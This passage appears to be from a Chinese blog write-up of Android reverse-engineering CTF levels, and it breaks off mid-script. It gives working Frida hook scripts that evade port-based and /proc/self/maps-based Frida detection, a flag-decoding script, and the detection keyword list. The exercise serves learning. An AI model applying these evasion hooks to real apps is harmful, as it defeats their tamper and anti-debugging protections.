*)&amp;v8[v21 + <span class="hljs-number">16</span>] = v24;<br>LABEL_22:<br>    <span class="hljs-keyword">if</span> ( v7 == v9 )<br>      <span class="hljs-keyword">goto</span> LABEL_11;<br>    <span class="hljs-keyword">if</span> ( (v7 &amp; <span class="hljs-number">0x18</span>) == <span class="hljs-number">0</span> )<br>      <span class="hljs-keyword">goto</span> LABEL_7;<br>    <span class="hljs-keyword">goto</span> LABEL_24;<br>  &#125;<br>  v9 = <span class="hljs-number">0LL</span>;<br>LABEL_24:<br>  v25 = v9;<br>  v9 = v7 &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFF8LL</span>;<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    *(_QWORD *)&amp;v8[v25] = _mm_xor_si128(_mm_loadl_epi64((<span class="hljs-type">const</span> __m128i *)&amp;v6[v25]), (__m128i)<span class="hljs-number">-1LL</span>).m128i_u64[<span class="hljs-number">0</span>];<br>    v25 += <span class="hljs-number">8LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v9 != v25 );<br>  <span class="hljs-keyword">if</span> ( v7 != v9 )<br>    <span class="hljs-keyword">goto</span> LABEL_7;<br>LABEL_11:<br>  v8[v7] = <span class="hljs-number">0</span>;<br>  v12 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( v7 == (<span class="hljs-type">int</span>)__strlen_chk(&amp;storedBytes, <span class="hljs-number">256LL</span>) )<br>    v12 = <span class="hljs-built_in">memcmp</span>(v8, &amp;storedBytes, v7) == <span class="hljs-number">0</span>;<br>  v13 = (*(__int64 (__fastcall **)(__int64, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *))(*(_QWORD *)a1 + <span class="hljs-number">48LL</span>))(a1, <span class="hljs-string">&quot;java/lang/Boolean&quot;</span>);<br>  v14 = v13;<br>  v15 = (*(__int64 (__fastcall **)(__int64, __int64, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *))(*(_QWORD *)a1 + <span class="hljs-number">264LL</span>))(<br>          a1,<br>          v13,<br>          <span class="hljs-string">&quot;&lt;init&gt;&quot;</span>,<br>          <span class="hljs-string">&quot;(Z)V&quot;</span>);<br>  v4 = _JNIEnv::<span class="hljs-built_in">NewObject</span>(a1, v14, v15, v12, v16, v17, v26);<br>  (*(<span class="hljs-built_in">void</span> (__fastcall **)(__int64, __int64, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *))(*(_QWORD *)a1 + <span class="hljs-number">1360LL</span>))(a1, v27, v6);<br>  <span class="hljs-keyword">operator</span> <span class="hljs-keyword">delete</span>[](v8);<br>  <span class="hljs-keyword">return</span> v4;<br>&#125;<br></code></pre></td></tr></table></figure><p>大概流程和 “动态注册” 这个题差不多，对传入字符串按位取反，最后存储在 <code>storedBytes</code> 中，把密文提取出来，解出来居然是假的，what can i say.jpg</p><p><img src="https://img.dkdun.cn/v1/2025/12/ee3e640eabe6526b.png"></p><p>然后看了下 <a href="https://bbs.kanxue.com/user-home-979679.htm">Shangwendada</a> 的《对init_array段调用的方法进行Hook》这篇文章，首先我们在 <code>segments</code> 窗口中看到各个段的偏移，找到了 <code>.init_array</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/2f5d4e6f30c67607.png"></p><p>找到了 <code>sub_17360</code> 函数</p><p><img src="https://img.dkdun.cn/v1/2025/12/83eba5c9f480fd9f.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">__int64 <span class="hljs-title">sub_17360</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-built_in">memcpy</span>(&amp;storedBytes, &amp;unk_CA70, <span class="hljs-number">0x100uLL</span>);<br>  <span class="hljs-keyword">return</span> __android_log_print(<span class="hljs-number">4LL</span>, <span class="hljs-string">&quot;GenFunction&quot;</span>, <span class="hljs-string">&quot;Gen function called.&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>原来 <code>storedBytes</code> 保存了从 <code>unk_CA70</code> 复制的数据，那 <code>unk_CA70</code> 应该就是正确的密文</p><p><img src="https://img.dkdun.cn/v1/2025/12/c2343f20172c0f9d.png"></p><p>exp 也是和之前那个题一样，换一下密文就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">ida_chars = [<br>  <span class="hljs-number">0x99</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xB6</span>,<br>  <span class="hljs-number">0x91</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x82</span><br>]<br><br>decrypted_string = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(~byte &amp; <span class="hljs-number">0xFF</span>) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> ida_chars)<br><span class="hljs-built_in">print</span>(decrypted_string)<br></code></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">flag&#123;EasyInitArray&#125;<br></code></pre></td></tr></table></figure><h1 id="Frida-端口检测-level8"><a href="#Frida-端口检测-level8" class="headerlink" title="Frida 端口检测-level8"></a><strong>Frida 端口检测</strong>-level8</h1><p>先反编译一下，在 <code>native</code> 层调用了 <code>Check</code> 函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.swdd.summertrain;<br><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.widget.TextView;<br><span class="hljs-keyword">import</span> android.widget.Toast;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><span class="hljs-keyword">import</span> com.swdd.summertrain.databinding.ActivityMainBinding;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>    <span class="hljs-keyword">private</span> ActivityMainBinding binding;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        System.loadLibrary(<span class="hljs-string">&quot;summertrain&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">native</span> Boolean <span class="hljs-title function_">Check</span><span class="hljs-params">(String arg1)</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View view0)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> ((TextView)<span class="hljs-built_in">this</span>.findViewById(id.input)).getText().toString();<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.Check(s).booleanValue()) &#123;<br>            Toast.makeText(<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;Good! Your flag is flag&#123;&quot;</span> + s + <span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-number">0</span>).show();<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        Toast.makeText(<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;Try Again&quot;</span>, <span class="hljs-number">0</span>).show();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span>  <span class="hljs-comment">// androidx.fragment.app.FragmentActivity</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle bundle0)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(bundle0);<br>        <span class="hljs-type">ActivityMainBinding</span> <span class="hljs-variable">activityMainBinding0</span> <span class="hljs-operator">=</span> ActivityMainBinding.inflate(<span class="hljs-built_in">this</span>.getLayoutInflater());<br>        <span class="hljs-built_in">this</span>.binding = activityMainBinding0;<br>        <span class="hljs-built_in">this</span>.setContentView(activityMainBinding0.getRoot());<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>没啥有用的信息，直接运行一下程序，正常是可以运行的，在启动了 <code>frida</code> 后程序停止运行了</p><p><img src="https://img.dkdun.cn/v1/2025/12/0cf6bfb81fd443cd.png"></p><p>这个时候就可以查看 <code>.so</code>  文件了，在 <code>segments</code> 窗口中看各个段的偏移，找到了 <code>.init_array</code> 然后进入<code>sub_F40</code> 函数</p><p>下面的一大堆什么玩意儿我也看不懂qwq，但是前面有一个 <code>check_ports</code> 函数</p><p><img src="https://img.dkdun.cn/v1/2025/12/308618ee3d58d3f3.png"></p><p>大概内容是通过 <code>connect</code> 检测连接 <code>127.0.0.1</code> 的两个端口检测是否被连接</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">*&amp;addr.s<span class="hljs-built_in">a_family</span> = <span class="hljs-number">0</span>xA2690002<span class="hljs-comment">;       </span><br>*addr.s<span class="hljs-built_in">a_data</span> = <span class="hljs-number">0</span>x8A5D<span class="hljs-comment">;              </span><br></code></pre></td></tr></table></figure><p>这里有一个网络字节转换的知识点（emmm计网的东西还没学），网络字节序是大端模式（Big-Endian），而主机字节序可能是小端模式（Little-Endian），关于这个大小端（死去的回忆突然开始攻击我），简单说一下</p><ul><li>大端字节序（Big Endian）：最高有效位存于最低内存地址处，最低有效位存于最高内存处</li><li>小端字节序（Little Endian）：最高有效位存于最高内存地址，最低有效位存于最低内存处</li></ul><p>所以我们可以根据信息得出端口</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">xA2690002</span>-&gt;</span><span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">xA269</span>-&gt;</span><span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x69A2</span>-&gt;</span><span class="hljs-number">27042</span><br><span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x8A5D</span>-&gt;</span><span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x5D8A</span>-&gt;</span><span class="hljs-number">23946</span><br></code></pre></td></tr></table></figure><p><code>23946</code> 端口是 IDA android_server 的默认端口，<code>27042</code> 是 Frida 默认端口</p><p><img src="https://img.dkdun.cn/v1/2025/12/8da71fcd02c31a16.png"></p><p>因此我们解决办法就是开启 frida 时把端口改了，不然会被检测到</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">./frida-server -l <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">9997</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/d0d1117d0513d160.png"></p><p>然后我打开程序的时候老是跳出这个弹窗，烦死了</p><p><img src="https://img.dkdun.cn/v1/2025/12/92a8ced625aec488.png"></p><p>可以使用这个命令来关掉（菜鸡，还不知道有什么其他方法）</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">adb shell am clear-debug-app<br></code></pre></td></tr></table></figure><p>写一个脚本 hook.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> targetAddress = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&quot;strcmp&quot;</span>);<br>    <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(targetAddress, &#123;<br>        <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">var</span> input = <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readUtf8String</span>(args[<span class="hljs-number">0</span>]);<br>                <span class="hljs-keyword">if</span> (input.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;aaa&quot;</span>)) &#123;<br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;FLAG: &quot;</span> + <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readUtf8String</span>(args[<span class="hljs-number">1</span>]));<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&quot;Error: &quot;</span> + e);<br>            &#125;<br>        &#125;<br>    &#125;);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-title function_">hook</span>();<br>        <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivity</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.swdd.summertrain.MainActivity&quot;</span>);<br>        <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivityInstance</span> = <span class="hljs-title class_">MainActivity</span>.$new();<br>        <span class="hljs-title class_">MainActivityInstance</span>.<span class="hljs-title class_">Check</span>(<span class="hljs-string">&quot;aaa&quot;</span>);<br>    &#125;);<br>&#125;<br><span class="hljs-title function_">setImmediate</span>(main);<br></code></pre></td></tr></table></figure><p>这里需要先把端口转发一下，把模拟器的 <code>9997</code> 端口转发到本地的 <code>9997</code>，因为通过 <code>adb forward</code> 把它的端口映射到了本地，hook 时需要写一个  <code>127.0.0.1:9997</code> （其实还可以用本机的 IP，但是有时候可能会比较麻烦，模拟器有时候无法直接通过 IP 访问设备上的一些服务）连接到这个端口</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">./frida-server <span class="hljs-number">0.0.0.0</span>:<span class="hljs-number">9997</span><br>adb forward tcp:<span class="hljs-number">9997</span> tcp:<span class="hljs-number">9997</span><br>frida -H <span class="hljs-number">127.0.0.1</span>:<span class="hljs-number">9997</span> -f com.swdd.summertrain -l hook.js<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/342d0198eba009a7.png"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">flag&#123;<span class="hljs-number">53</span>cd3f37664bd01357182ca13bc2f9b6&#125;<br></code></pre></td></tr></table></figure><h1 id="Frida检测之Maps-level9"><a href="#Frida检测之Maps-level9" class="headerlink" title="Frida检测之Maps-level9"></a>Frida检测之Maps-level9</h1><p>Java 层没什么东西，同样是看 <code>Native</code> 层，这里有一个检测 <code>maps</code> 的。</p><p><code>/proc/self/maps</code> 是一个特殊的文件，它包含了当前进程的内存映射信息。当你打开这个文件时，它会显示一个列表，其中包含了进程中每个内存区域的详细信息。这些信息通常包括：</p><ul><li>起始地址（Start Address）</li><li>结束地址（End Address）</li><li>权限（如可读、可写、可执行）</li><li>共享&#x2F;私有标志（Shared or Private）</li><li>关联的文件或设备（如果内存区域是文件映射的）</li><li>内存区域的偏移量</li><li>内存区域的类型（如匿名映射、文件映射、设备映射等）</li></ul><p>当注入frida后，在maps文件中就会存在 <code>frida-agent-64.so</code>、<code>frida-agent-32.so</code> 等文件。</p><p>（上面这段专业术语 copy 的 52 的正己师傅的hhhhh）</p><p><img src="https://img.dkdun.cn/v1/2025/12/e46f7cc7608020b7.png"></p><p>这个函数流程就是打开 <code>proc/self/maps</code> ，然后检测是否有这些内存特征，如果有就直接终止程序</p><ul><li><code>frida</code>：检测 Frida 注入的 Agent 或 Server</li><li><code>gadget</code>&#x2F;<code>agent</code>：检测 Frida Gadget 或调试工具组件</li><li><code>/data/local/tmp/</code>：检测临时目录下的注入文件（如 Frida Server）</li><li><code>-64.so</code>&#x2F;<code>-32.so</code>：检测特定架构的动态库（如 Frida 的 64&#x2F;32 位库）</li></ul><p>hook 脚本，重定向一个 <code>maps</code> </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 定义一个函数，用于重定向并修改maps文件内容，以隐藏特定的库和路径信息</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">mapsRedirect</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// 定义伪造的maps文件路径</span><br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">FakeMaps</span> = <span class="hljs-string">&quot;/data/data/com.swdd.summertrain/maps&quot;</span>;<br>    <span class="hljs-comment">// 获取libc.so库中&#x27;open&#x27;函数的地址</span><br>    <span class="hljs-keyword">const</span> openPtr = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">getExportByName</span>(<span class="hljs-string">&#x27;libc.so&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>);<br>    <span class="hljs-comment">// 根据地址创建一个新的NativeFunction对象，表示原生的&#x27;open&#x27;函数</span><br>    <span class="hljs-keyword">const</span> open = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeFunction</span>(openPtr, <span class="hljs-string">&#x27;int&#x27;</span>, [<span class="hljs-string">&#x27;pointer&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>]);<br>    <span class="hljs-comment">// 查找并获取libc.so库中&#x27;read&#x27;函数的地址</span><br>    <span class="hljs-keyword">var</span> readPtr = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&quot;read&quot;</span>);<br>    <span class="hljs-comment">// 创建新的NativeFunction对象表示原生的&#x27;read&#x27;函数</span><br>    <span class="hljs-keyword">var</span> read = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeFunction</span>(readPtr, <span class="hljs-string">&#x27;int&#x27;</span>, [<span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;pointer&#x27;</span>, <span class="hljs-string">&quot;int&quot;</span>]);<br>    <span class="hljs-comment">// 分配512字节的内存空间，用于临时存储从maps文件读取的内容</span><br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">MapsBuffer</span> = <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">alloc</span>(<span class="hljs-number">512</span>);<br>    <span class="hljs-comment">// 创建一个伪造的maps文件，用于写入修改后的内容，模式为&quot;w&quot;（写入）</span><br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">MapsFile</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-title class_">FakeMaps</span>, <span class="hljs-string">&quot;w&quot;</span>);<br>    <span class="hljs-comment">// 使用Interceptor替换原有的&#x27;open&#x27;函数，注入自定义逻辑</span><br>    <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">replace</span>(openPtr, <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeCallback</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">pathname, flag</span>) &#123;<br>        <span class="hljs-comment">// 调用原始的&#x27;open&#x27;函数，并获取文件描述符（FD）</span><br>        <span class="hljs-keyword">var</span> <span class="hljs-variable constant_">FD</span> = <span class="hljs-title function_">open</span>(pathname, flag);<br>        <span class="hljs-comment">// 读取并打印尝试打开的文件路径</span><br>        <span class="hljs-keyword">var</span> ch = pathname.<span class="hljs-title function_">readCString</span>();<br>        <span class="hljs-keyword">if</span> (ch.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;/proc/&quot;</span>) &gt;= <span class="hljs-number">0</span> &amp;&amp; ch.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;maps&quot;</span>) &gt;= <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;open : &quot;</span>, pathname.<span class="hljs-title function_">readCString</span>());<br>            <span class="hljs-comment">// 循环读取maps内容，并写入伪造的maps文件中，同时进行字符串替换以隐藏特定信息</span><br>            <span class="hljs-keyword">while</span> (<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">read</span>(<span class="hljs-variable constant_">FD</span>, <span class="hljs-title class_">MapsBuffer</span>, <span class="hljs-number">512</span>)) !== <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">var</span> <span class="hljs-title class_">MBuffer</span> = <span class="hljs-title class_">MapsBuffer</span>.<span class="hljs-title function_">readCString</span>();<br>                <span class="hljs-title class_">MBuffer</span> = <span class="hljs-title class_">MBuffer</span>.<span class="hljs-title function_">replaceAll</span>(<span class="hljs-string">&quot;/data/local/tmp/re.frida.server/frida-agent-64.so&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br>                <span class="hljs-title class_">MBuffer</span> = <span class="hljs-title class_">MBuffer</span>.<span class="hljs-title function_">replaceAll</span>(<span class="hljs-string">&quot;re.frida.server&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br>                <span class="hljs-title class_">MBuffer</span> = <span class="hljs-title class_">MBuffer</span>.<span class="hljs-title function_">replaceAll</span>(<span class="hljs-string">&quot;frida&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br>                <span class="hljs-title class_">MBuffer</span> = <span class="hljs-title class_">MBuffer</span>.<span class="hljs-title function_">replaceAll</span>(<span class="hljs-string">&quot;agent&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br>                <span class="hljs-title class_">MBuffer</span> = <span class="hljs-title class_">MBuffer</span>.<span class="hljs-title function_">replaceAll</span>(<span class="hljs-string">&quot;-32.so&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br>                <span class="hljs-title class_">MBuffer</span> = <span class="hljs-title class_">MBuffer</span>.<span class="hljs-title function_">replaceAll</span>(<span class="hljs-string">&quot;-64.so&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br>                <span class="hljs-title class_">MBuffer</span> = <span class="hljs-title class_">MBuffer</span>.<span class="hljs-title function_">replaceAll</span>(<span class="hljs-string">&quot;gadget&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br>                <span class="hljs-title class_">MBuffer</span> = <span class="hljs-title class_">MBuffer</span>.<span class="hljs-title function_">replaceAll</span>(<span class="hljs-string">&quot;/data/local/tmp&quot;</span>, <span class="hljs-string">&quot;/1&quot;</span>);<br>                <span class="hljs-comment">// 将修改后的内容写入伪造的maps文件</span><br>                <span class="hljs-title class_">MapsFile</span>.<span class="hljs-title function_">write</span>(<span class="hljs-title class_">MBuffer</span>);<br>            &#125;<br>            <span class="hljs-comment">// 为返回伪造maps文件的打开操作，分配UTF8编码的文件名字符串</span><br>            <span class="hljs-keyword">var</span> filename = <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">allocUtf8String</span>(<span class="hljs-title class_">FakeMaps</span>);<br>            <span class="hljs-comment">// 返回打开伪造maps文件的文件描述符</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_">open</span>(filename, flag);<br>        &#125;<br>        <span class="hljs-comment">// 如果不是目标maps文件，则直接返回原open调用的结果</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable constant_">FD</span>;<br>    &#125;, <span class="hljs-string">&#x27;int&#x27;</span>, [<span class="hljs-string">&#x27;pointer&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>]));<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">mapsRedirect</span>();<br>    <span class="hljs-keyword">var</span> targetAddress=<span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;libc.so&quot;</span>,<span class="hljs-string">&quot;strcmp&quot;</span>);<br>    <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(targetAddress,&#123;<br>        <span class="hljs-attr">onEnter</span>:<span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>)&#123;<br>            <span class="hljs-keyword">var</span> input =<span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readUtf8String</span>(args[<span class="hljs-number">0</span>]);<br>            <span class="hljs-keyword">if</span> (input.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;aaa&quot;</span>))&#123;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;FLAG:&quot;</span>+<span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readUtf8String</span>(args[<span class="hljs-number">1</span>]));<br>            &#125;<br>        &#125;,<span class="hljs-attr">onLeave</span>:<span class="hljs-keyword">function</span> (<span class="hljs-params">retval</span>)&#123;<br><br>        &#125;<br>    &#125;)<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivity</span>=<span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.swdd.summertrain.MainActivity&quot;</span>);<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivityInstance</span>=<span class="hljs-title class_">MainActivity</span>.$new();<br>    <span class="hljs-title class_">MainActivityInstance</span>.<span class="hljs-title class_">Check</span>(<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br>        